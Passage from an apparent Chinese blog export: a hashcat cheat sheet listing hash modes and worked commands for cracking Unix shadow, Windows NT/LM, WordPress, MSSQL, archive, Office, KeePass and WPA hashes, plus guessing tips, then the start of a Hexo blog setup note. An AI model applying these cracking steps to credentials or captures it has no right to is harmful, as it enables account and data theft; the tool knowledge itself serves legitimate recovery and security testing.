<tr class="even">
<td>1800</td>
<td><code>sha512crypt $6$, SHA512 (Unix)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>122</td>
<td><code>macOS v10.4, MacOS v10.5, MacOS v10.6</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>1722</td>
<td><code>macOS v10.7</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>7100</td>
<td><code>macOS v10.8+ (PBKDF2-SHA512)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>6300</td>
<td><code>AIX &#123;smd5&#125;</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>6700</td>
<td><code>AIX &#123;ssha1&#125;</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>6400</td>
<td><code>AIX &#123;ssha256&#125;</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>6500</td>
<td><code>AIX &#123;ssha512&#125;</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>2400</td>
<td><code>Cisco-PIX MD5</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>2410</td>
<td><code>Cisco-ASA MD5</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>500</td>
<td><code>Cisco-IOS $1$ (MD5)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>5700</td>
<td><code>Cisco-IOS type 4 (SHA256)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>9200</td>
<td><code>Cisco-IOS $8$ (PBKDF2-SHA256)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>9300</td>
<td><code>Cisco-IOS $9$ (scrypt)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>22</td>
<td><code>Juniper NetScreen/SSG (ScreenOS)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>501</td>
<td><code>Juniper IVE</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>15100</td>
<td><code>Juniper/NetBSD sha1crypt</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>7000</td>
<td><code>FortiGate (FortiOS)</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>5800</td>
<td><code>Samsung Android Password/PIN</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>13800</td>
<td><code>Windows Phone 8+ PIN/password</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>8100</td>
<td><code>Citrix NetScaler</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>8500</td>
<td><code>RACF</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>7200</td>
<td><code>GRUB 2</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>9900</td>
<td><code>Radmin2</code></td>
<td>Operating Systems</td>
</tr>
<tr class="even">
<td>125</td>
<td><code>ArubaOS</code></td>
<td>Operating Systems</td>
</tr>
<tr class="odd">
<td>7700</td>
<td><code>SAP CODVN B (BCODE)</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="even">
<td>7701</td>
<td><code>SAP CODVN B (BCODE) via RFC_READ_TABLE</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="odd">
<td>7800</td>
<td><code>SAP CODVN F/G (PASSCODE)</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="even">
<td>7801</td>
<td><code>SAP CODVN F/G (PASSCODE) via RFC_READ_TABLE</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="odd">
<td>10300</td>
<td><code>SAP CODVN H (PWDSALTEDHASH) iSSHA-1</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="even">
<td>8600</td>
<td><code>Lotus Notes/Domino 5</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="odd">
<td>8700</td>
<td><code>Lotus Notes/Domino 6</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="even">
<td>9100</td>
<td><code>Lotus Notes/Domino 8</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="odd">
<td>133</td>
<td><code>PeopleSoft</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="even">
<td>13500</td>
<td><code>PeopleSoft PS_TOKEN</code></td>
<td>Enterprise Application Software (EAS)</td>
</tr>
<tr class="odd">
<td>11600</td>
<td><code>7-Zip</code></td>
<td>Archives</td>
</tr>
<tr class="even">
<td>12500</td>
<td><code>RAR3-hp</code></td>
<td>Archives</td>
</tr>
<tr class="odd">
<td>13000</td>
<td><code>RAR5</code></td>
<td>Archives</td>
</tr>
<tr class="even">
<td>13200</td>
<td><code>AxCrypt</code></td>
<td>Archives</td>
</tr>
<tr class="odd">
<td>13300</td>
<td><code>AxCrypt in-memory SHA1</code></td>
<td>Archives</td>
</tr>
<tr class="even">
<td>13600</td>
<td><code>WinZip</code></td>
<td>Archives</td>
</tr>
<tr class="odd">
<td>14700</td>
<td><code>iTunes backup &lt; 10.0</code></td>
<td>Backup</td>
</tr>
<tr class="even">
<td>14800</td>
<td><code>iTunes backup &gt;= 10.0</code></td>
<td>Backup</td>
</tr>
<tr class="odd">
<td>62XY</td>
<td><code>TrueCrypt</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>1 = PBKDF2-HMAC-RIPEMD160</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>X</td>
<td><code>2 = PBKDF2-HMAC-SHA512</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>3 = PBKDF2-HMAC-Whirlpool</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>X</td>
<td><code>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>1 = XTS  512 bit pure AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded AES-Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Serpent-AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Twofish-Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>3 = XTS 1536 bit all</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>8800</td>
<td><code>Android FDE &lt;= 4.3</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>12900</td>
<td><code>Android FDE (Samsung DEK)</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>12200</td>
<td><code>eCryptfs</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>137XY</td>
<td><code>VeraCrypt</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>1 = PBKDF2-HMAC-RIPEMD160</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>X</td>
<td><code>2 = PBKDF2-HMAC-SHA512</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>3 = PBKDF2-HMAC-Whirlpool</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>X</td>
<td><code>4 = PBKDF2-HMAC-RIPEMD160 + boot-mode</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>5 = PBKDF2-HMAC-SHA256</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>X</td>
<td><code>6 = PBKDF2-HMAC-SHA256 + boot-mode</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>X</td>
<td><code>7 = PBKDF2-HMAC-Streebog-512</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>1 = XTS  512 bit pure AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Camellia</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>1 = XTS  512 bit pure Kuznyechik</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Camellia</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit pure Kuznyechik</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded AES-Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Camellia-Kuznyechik</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Camellia-Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Kuznyechik-AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Kuznyechik-Twofish</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Serpent-AES</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>Y</td>
<td><code>2 = XTS 1024 bit cascaded Twofish-Serpent</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>Y</td>
<td><code>3 = XTS 1536 bit all</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>14600</td>
<td><code>LUKS</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>16700</td>
<td><code>FileVault 2</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="odd">
<td>18300</td>
<td><code>Apple File System (APFS)</code></td>
<td>Full-Disk Encryption (FDE)</td>
</tr>
<tr class="even">
<td>9700</td>
<td><code>MS Office &lt;= 2003 $0/$1, MD5 + RC4</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>9710</td>
<td><code>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>9720</td>
<td><code>MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>9800</td>
<td><code>MS Office &lt;= 2003 $3/$4, SHA1 + RC4</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>9810</td>
<td><code>MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>9820</td>
<td><code>MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>9400</td>
<td><code>MS Office 2007</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>9500</td>
<td><code>MS Office 2010</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>9600</td>
<td><code>MS Office 2013</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>10400</td>
<td><code>PDF 1.1 - 1.3 (Acrobat 2 - 4)</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>10410</td>
<td><code>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>10420</td>
<td><code>PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>10500</td>
<td><code>PDF 1.4 - 1.6 (Acrobat 5 - 8)</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>10600</td>
<td><code>PDF 1.7 Level 3 (Acrobat 9)</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>10700</td>
<td><code>PDF 1.7 Level 8 (Acrobat 10 - 11)</code></td>
<td>Documents</td>
</tr>
<tr class="odd">
<td>16200</td>
<td><code>Apple Secure Notes</code></td>
<td>Documents</td>
</tr>
<tr class="even">
<td>9000</td>
<td><code>Password Safe v2</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>5200</td>
<td><code>Password Safe v3</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>6800</td>
<td><code>LastPass + LastPass sniffed</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>6600</td>
<td><code>1Password, agilekeychain</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>8200</td>
<td><code>1Password, cloudkeychain</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>11300</td>
<td><code>Bitcoin/Litecoin wallet.dat</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>12700</td>
<td><code>Blockchain, My Wallet</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>15200</td>
<td><code>Blockchain, My Wallet, V2</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>16600</td>
<td><code>Electrum Wallet (Salt-Type 1-3)</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>13400</td>
<td><code>KeePass 1 (AES/Twofish) and KeePass 2 (AES)</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>15500</td>
<td><code>JKS Java Key Store Private Keys (SHA1)</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>15600</td>
<td><code>Ethereum Wallet, PBKDF2-HMAC-SHA256</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>15700</td>
<td><code>Ethereum Wallet, SCRYPT</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>16300</td>
<td><code>Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256</code></td>
<td>Password Managers</td>
</tr>
<tr class="even">
<td>16900</td>
<td><code>Ansible Vault</code></td>
<td>Password Managers</td>
</tr>
<tr class="odd">
<td>18100</td>
<td><code>TOTP (HMAC-SHA1)</code></td>
<td>One-Time Passwords</td>
</tr>
<tr class="even">
<td>99999</td>
<td><code>Plaintext</code></td>
<td>Plaintext</td>
</tr>
</tbody>
</table>
<h1 id="实例演示">实例演示</h1>
<h2 id="使用字典进行爆破">使用字典进行爆破</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 0192023a7bbd73250516f069df18b500 password.txt --force</span><br></pre></td></tr></table></figure>
<h2 id="使用指定字符集爆破">使用指定字符集爆破</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 63a9f0ea7bb98050796b649e85481845 ?l?l?l?l --force</span><br></pre></td></tr></table></figure>
<h2 id="使用字典掩码进行爆破">使用字典+掩码进行爆破</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 6 1844156d4166d94387f1a4ad031ca5fa password.txt ?d?d?d --force</span><br></pre></td></tr></table></figure>
<h2 id="使用掩码字典进行破解">使用掩码+字典进行破解</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 7 f8def8bcecb2e7925a2b42d60d202deb ?d?d password.txt --force</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意 hashcat 优先选择的规则不一样</p>
</blockquote>
<h2 id="mysql4.15的-password-函数">Mysql4.1/5的 <code>PASSWORD</code>
函数</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 300 --force 6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="sha512crypt-6-sha512-unix破解">sha512crypt <span class="math inline">\(6\)</span>, SHA512 (Unix)破解</h2>
<p>可以通过 <code>cat /etc/shadow</code> 获取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 --force $6$mxuA5cdy<span class="variable">$XZRk0CvnPFqOgVopqiPEFAFK72SogKVwwwp7gWaUOb7b6tVwfCpcSUsCEk64ktLLYmzyew</span>/xd0O0hPG/yrm2X. ?l?l?l?l</span><br></pre></td></tr></table></figure>
<p>不需要整理用户名，可以使用 <code>--username</code> 参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1800 --force qiyou:$6$QDq75ki3<span class="variable">$jsKm7qTDHz</span>/xBob0kF1Lp170Cgg0i5Tslf3JW/sm9k9Q916mBTyilU3PoOsbRdxV8TAmzvdgNjrCuhfg3jKMY1 ?l?l?l?l?l --username</span><br></pre></td></tr></table></figure>
<h2 id="windows-nt-hashlm-hash破解">Windows NT-hash，LM-hash破解</h2>
<p>可以用 saminside 获取 NT-hash 或 LM-hash 的值</p>
<ul>
<li><p>NT-hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</span><br></pre></td></tr></table></figure></li>
<li><p>LM-hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mssql-破解">mssql 破解</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="wordpress-密码-hash-破解">wordpress 密码 hash 破解</h2>
<p>具体加密脚本在<code>./wp-includes/class-phpass.php</code>的<code>HashPassword</code>函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 400 --force $P<span class="variable">$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY</span>/ ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="discuz-用户密码-hash-破解">discuz 用户密码 hash 破解</h2>
<p>其密码加密方式 <code>md5(md5($pass).$salt)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="rar-压缩包密码破解">RAR 压缩包密码破解</h2>
<p>先用 rar2john 获取 RAR 文件 hash 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; rar2john 1.rar</span><br><span class="line">1.rar:$rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8<span class="variable">$04a52d2224ad082e</span></span><br></pre></td></tr></table></figure>
<p>然后再使用 hashcat 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 13000 --force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8<span class="variable">$04a52d2224ad082e</span> ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>注意到</p>
<table>
<colgroup>
<col style="width: 9%">
<col style="width: 9%">
<col style="width: 81%">
</colgroup>
<thead>
<tr class="header">
<th>-m 参数</th>
<th>类型</th>
<th>示例 hash</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>12500</td>
<td>RAR3-hp</td>
<td><code>$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</code></td>
</tr>
<tr class="even">
<td>13000</td>
<td>RAR5</td>
<td><code>$rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe</code></td>
</tr>
</tbody>
</table>
<h2 id="zip-压缩包密码破解">ZIP 压缩包密码破解</h2>
<p>先用 zip2john 获取 RAR 文件 hash 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; zip2john.exe 1.zip</span><br><span class="line">1.zip:$zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$:::::1.zip-1.txt</span><br></pre></td></tr></table></figure>
<p>然后再使用 hashcat 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 13600 $zip2$*0*3*0*554bb43ff71cb0cac76326f292119dfd*ff23*5*24b28885ee*d4fe362bb1e91319ab53*$/zip2$ --force ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="office-密码破解">office 密码破解</h2>
<p>先用 zip2john 获取 RAR 文件 hash 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; python office2john.py 11.docx</span><br><span class="line">11.docx:$office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9</span><br></pre></td></tr></table></figure>
<p>然后再使用 hashcat 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 9600 $office$*2013*100000*256*16*e4a3eb62e8d3576f861f9eded75e0525*9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 --force ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="keepass-爆破">Keepass 爆破</h2>
<p>先用 zip2john 获取 RAR 文件 hash 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; keepass2john.exe .\clients.kdbx</span><br><span class="line">clients:$keepass$*2*9090908*0*f7d1170d7371a17281aa3f2a26c7388ca5725c21fcbc29d2ace56292eff8eb79*da67f7ac407dca58cbdf4470f411f0f816b93e09e691cc4fbe0d9ce4acaa28c0*706a344c94d1eb4d7e356d67c6b3189b*ef40e4466434309c67248c2ad1e6bb0d4319447268f862c53a196e4ca12e29a0*7ff7758edbc9b8cde051228494e36af1edd750edc398e84422268956dc942876</span><br></pre></td></tr></table></figure>
<p>然后再使用 hashcat 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 13400 $keepass$*2*9090908*0*f7d1170d7371a17281aa3f2a26c7388ca5725c21fcbc29d2ace56292eff8eb79*da67f7ac407dca58cbdf4470f411f0f816b93e09e691cc4fbe0d9ce4acaa28c0*706a344c94d1eb4d7e356d67c6b3189b*ef40e4466434309c67248c2ad1e6bb0d4319447268f862c53a196e4ca12e29a0*7ff7758edbc9b8cde051228494e36af1edd750edc398e84422268956dc942876 --force ?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="wifi-密码破解">WIFI 密码破解</h2>
<p>首先先把握手包转化为 hccapx 格式</p>
<blockquote>
<p>现在最新版的 hashcat 只支持 hccapx 格式了，以前的 hccap
格式已经不支持了</p>
</blockquote>
<p>可以使用 <a href="https://hashcat.net/cap2hccapx/">https://hashcat.net/cap2hccapx/</a>
进行转换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</span><br></pre></td></tr></table></figure>
<h2 id="网络包嗅探">网络包嗅探</h2>
<p>使用指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tqr ospf.pcapng</span><br></pre></td></tr></table></figure>
<p>可以一键嗅探出流量包中的哈希值。</p>
<h1 id="使用建议">使用建议</h1>
<ol type="1">
<li><p>对于破解过的hash值，用<code>hashcat64.exe hash --show</code>查看结果</p></li>
<li><p>所有的hash破解结果都在hashcat.potfile文件中</p></li>
<li><p>如果破解的时间太长，可以按s键可以查看破解的状态，p键暂停，r键继续破解，q键退出破解。</p></li>
<li><p>在使用GPU模式进行破解时，可以使用-O参数自动进行优化</p></li>
<li><p>在实际破解中的建议，如果我们盲目的去破解，会占用我们大量的时间和资源</p>
<ol type="1">
<li>首先走一遍常用的弱口令字典</li>
<li>组合密码，如：zhang1999，用姓氏和出生年组合，当然也可以用其它的组合，这里举个例子而已</li>
<li>把常用的掩码组合整理起来放在masks中的.hcmask文件中，然后让它自动加载破解</li>
<li>如果实在不行，你可以尝试低位数的所有组合去跑，不过不建议太高位数的组合去破解，因为如果对方设置的密码很复杂的话，到头来你密码没有破解到，却浪费了大量的时间和资源，得不偿失</li>
</ol></li>
<li><p>Hashcat 参数优化</p>
<ol type="1">
<li><p>Workload tuning 负载调优</p>
<p>该参数支持的值有1,8,40,80,160，可以让GPU发挥最大性能</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-accel 160</span><br></pre></td></tr></table></figure></li>
<li><p>Gpu loops 负载微调</p>
<p>该参数支持的值的范围是8-1024（有些算法只支持到1000），可以让GPU发挥最大性能。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--gpu-loops 1024</span><br></pre></td></tr></table></figure></li>
<li><p>Segment size 字典缓存大小</p>
<p>该参数是设置内存缓存的大小，作用是将字典放入内存缓存以加快字典破解速度，默认为32MB，可以根据自身内存情况进行设置，当然是越大越块了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--segment-size 512</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>如果遇到不熟悉的哈希值，可以使用
<code>hash-identifier hash</code> 进行识别。</p></li>
<li><p>同时如果遇到不熟悉的哈希格式，可以使用
<code>hashcat -m 0 --hash-info</code>
获取某种攻击方式的具体哈希格式，例如上面这个命令是获取 md5
格式的哈希攻击方式。</p></li>
</ol>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 搭建 blog 笔记</title>
    <url>//hexo-note.html</url>
    <content><![CDATA[<h1 id="hexo-搭建-blog">hexo 搭建 blog</h1>
<h2 id="hexo-前置环境">hexo 前置环境</h2>
<ul>
<li><p><strong>Git</strong></p>
<p>Git 需要绑定好 Github 的账号与邮箱，并能够建立连接</p>
<blockquote>
<p><a href="/git-note.html#Git的User配置">绑定账号与邮箱</a></p>
<p><a href="/git-note.html#使用SSH方式远程连接Github">Git使用SSH与Github建立远程连接</a></p>
</blockquote></li>
<li><p><strong>Node.js</strong></p>
<p>尽量请使用 Node.js LTS 版本</p></li>
</ul>
<h2 id="hexo-安装">hexo 安装</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli		<span class="comment"># npm 安装 hexo</span></span><br></pre></td></tr></table></figure>
<h2 id="hexo-初始化">hexo 初始化</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init blog				<span class="comment"># 初始化 hexo</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>blog</strong> 是 hexo
初始化的文件夹，是<strong>博客根目录</strong>，可以更换成自己喜欢的文件夹名</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> blog						<span class="comment"># 切换到博客根目录</span></span><br><span class="line">npm install					<span class="comment"># 自动化安装依赖文件，完成 hexo 初始化</span></span><br></pre></td></tr></table></figure>
<p>以下用 <code>~/</code> 指代<strong>博客根目录</strong>。</p>
<h2 id="hexo-生成静态网页文件">hexo 生成静态网页文件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate				<span class="comment"># 自动化生成静态网页文件</span></span><br></pre></td></tr></table></figure>
<p>可选的额外选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g						<span class="comment"># 简化指令</span></span><br></pre></td></tr></table></figure>
<h2 id="hexo-服务">hexo 服务</h2>
